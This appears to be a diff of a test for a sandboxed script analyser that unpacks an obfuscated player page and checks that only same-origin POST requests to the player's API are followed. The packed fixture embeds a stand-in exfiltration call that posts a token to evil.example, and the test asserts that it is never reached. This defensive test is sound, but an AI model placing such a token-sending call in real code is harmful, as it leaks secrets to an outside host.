@@ -71,7 +71,8 @@ function response(url,type,body,status=200){return {
 const packed = '<html><script>'+
 'eval(function(p,a,c,k,e,d){return p}('+
 "'fetch(\"/api/source\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({file:\"abc123\",episode:1})});"+
-"fetch(\"https://evil.example/api\",{method:\"POST\",body:JSON.stringify({token:\"evil-secret\"})})'"+
+"fetch(\\\"https://evil.example/api\\\",{method:\\\"POST\\\",body:JSON.stringify({token:\\\"evil-secret\\\"})});"+
+"var x$=new XMLHttpRequest();x$.open(\\\"POST\\\",\\\"/api/video-meta\\\");x$.send(JSON.stringify({file:\\\"xhr123\\\",episode:1}))'"+
 ",62,0,''.split('|'),0,{}))"+
 '</script></html>';
 const sandbox={
@@ -86,6 +87,11 @@ const sandbox={
       if(method!=='POST'||body!=='{"file":"abc123","episode":1}')
         return response(url,'application/json','{"error":"bad-contract"}',400);
       return response(url,'application/json','{"source":"https://cdn.example/token/opaque"}');
+    }
+    if(url==='https://player.example/api/video-meta'){
+      if(method!=='POST'||body!=='{\"file\":\"xhr123\",\"episode\":1}')
+        return response(url,'application/json','{\"error\":\"bad-xhr-contract\"}',400);
+      return response(url,'application/json','{\"ok\":true}');
     }
     if(url==='https://cdn.example/token/opaque')
       return response(url,'application/vnd.apple.mpegurl','#EXTM3U\n#EXT-X-TARGETDURATION:6\n#EXTINF:6,\nseg.ts\n#EXT-X-ENDLIST\n');
@@ -131,11 +137,19 @@ assert len(bootstrap) == 1, payload
 assert bootstrap[0]["method"] == "POST", payload
 assert bootstrap[0]["body"] == '{"file":"abc123","episode":1}', payload
 assert bootstrap[0]["referer"] == "https://player.example/watch/fixture", payload
+xhr = [
+    row for row in calls
+    if row["url"] == "https://player.example/api/video-meta"
+]
+assert len(xhr) == 1, payload
+assert xhr[0]["method"] == "POST", payload
+assert xhr[0]["body"] == '{"file":"xhr123","episode":1}', payload
+assert xhr[0]["referer"] == "https://player.example/watch/fixture", payload
 assert not any(row["url"].startswith("https://evil.example/") for row in calls), payload
 assert not any(row["url"] == "https://player.example/login" for row in calls), payload
 
 print(
     "FIELD_BRAIN_SCRIPTED_REQUEST_CONTRACT "
-    "packed=true static_only=true same_origin=true post_json=true "
+    "packed=true static_only=true same_origin=true post_json=true xhr_post_json=true "
     "terminal_media=true persisted_secret=false"
 )
